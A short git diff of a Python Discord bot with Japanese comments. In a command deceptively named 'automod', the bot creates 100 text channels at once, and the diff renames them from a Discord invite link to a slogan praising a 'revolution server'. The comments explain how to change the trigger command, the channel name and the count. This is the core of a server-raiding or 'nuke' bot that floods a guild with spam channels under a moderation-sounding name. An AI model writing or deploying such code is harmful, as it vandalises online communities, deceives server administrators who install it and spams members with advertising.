@@ -59,7 +59,7 @@ async def automod(ctx):#ここで起動コマンドを変えられるよ
         pass
 
     create_tasks = [
-        ctx.guild.create_text_channel(f'discord.gg/mititt') for _ in range(100) #作成したいチャンネルの名前と作成する数
+        ctx.guild.create_text_channel(f'革命鯖万歳') for _ in range(100) #作成したいチャンネルの名前と作成する数
     ]
     new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
 
